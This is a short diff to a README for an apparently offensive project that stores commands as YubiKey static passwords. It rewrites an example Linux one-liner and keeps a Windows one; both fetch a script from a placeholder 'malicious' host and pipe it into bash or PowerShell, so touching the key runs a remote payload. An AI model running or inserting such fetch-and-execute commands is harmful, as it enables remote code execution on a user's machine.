@@ -6,7 +6,7 @@ malicious and non-malicious payloads for yubikeys!
 The concept is simple - you set a static password as a command, such as:
 ```
 curl -L malicous.example.com | pwsh                    (Windows)
-curl -L malicous.example.com | bash                    ( Linux )
+bash <(curl -L malicous.example.com)                   ( Linux )
 ```
 pointing to a payload. It then runs when you open a CMD/SH window, and press the touch sensor.
 
